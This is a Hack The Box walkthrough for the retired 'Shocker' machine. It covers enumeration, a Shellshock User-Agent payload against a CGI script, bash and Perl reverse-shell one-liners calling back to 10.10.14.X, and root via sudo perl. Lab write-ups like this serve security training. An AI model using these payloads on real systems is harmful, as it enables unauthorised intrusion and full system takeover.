# Hack The Box - Shocker

**Difficulty:** Easy  
**OS:** Linux  
**Technique:** Shellshock → Reverse shell → Sudo abuse (perl)  
**Flags:** 2 (user.txt, root.txt)

---

## 🧠 Overview

Shocker is a retired Hack The Box machine that leverages a Shellshock vulnerability in a CGI script to gain initial access, followed by privilege escalation through `sudo` permissions to execute `perl` as root.

---

## 🔍 Enumeration

### Nmap TCP Scan:

```bash
nmap -sC -sV -Pn -oN nmap/full 10.10.10.56
```

Result:

- **Port 80** open: Apache httpd 2.4.18 (Ubuntu)
    

No robots.txt. Web server displays a default Apache page.

### Directory brute-force:

```bash
gobuster dir -u http://10.10.10.56 -w /usr/share/wordlists/dirb/common.txt -x sh,html,php -o gobuster.txt
```

Found:

- `/cgi-bin/` → standard directory for CGI scripts
    
- `/cgi-bin/user.sh` → accessible file
    

Testing it manually returns HTTP 500 (Internal Server Error), but hints at a possible Bash CGI vulnerability.

---

## 💥 Exploitation (Shellshock)

Shellshock vulnerability in Bash allows remote command execution when improperly handling headers.

### Burp Suite Testing:

Send this crafted request to `/cgi-bin/user.sh`:

```http
GET /cgi-bin/user.sh HTTP/1.1
Host: 10.10.10.56
User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'
```

Response includes:

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

✅ Code execution confirmed.

### Reverse Shell:

1. Start listener:
    

```bash
nc -lvnp 4444
```

2. Send this payload (via Burp Repeater):
    

```http
User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1'
```

> Replace `10.10.14.X` with your VPN IP

✅ Reverse shell obtained as user `shelly`

---

## ⬆️ Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

Result:

```
User shelly may run the following commands on Shocker:
(root) NOPASSWD: /usr/bin/perl
```

### Option 1: Direct root shell

```bash
sudo perl -e 'exec "/bin/bash";'
```

### Option 2: Reverse shell as root (recommended)

1. On Kali:
    

```bash
nc -lvnp 4445
```

2. On target:
    

```bash
sudo perl -e 'use Socket;$i="10.10.14.X";$p=4445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

✅ You now have root shell!

---

## 🧼 Post Exploitation

### Stabilize Shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo
fg
export TERM=xterm
```

### Capture the Flags:

```bash
cat /home/shelly/user.txt
cat /root/root.txt
```

---

## 🧠 Lessons Learned

- The presence of `/cgi-bin/` should raise CGI-related concerns
    
- Shellshock is still relevant in legacy systems
    
- Always check `sudo -l` — a single allowed binary (like `perl`) can lead to full root access
    

---

## ✅ Root Summary

|Vector|Technique|
|---|---|
|Initial Access|Shellshock via CGI Bash script|
|PrivEsc|`sudo /usr/bin/perl` (NOPASSWD)|
|Result|Root shell + both flags|

---

✔️ Machine fully rooted and documented.
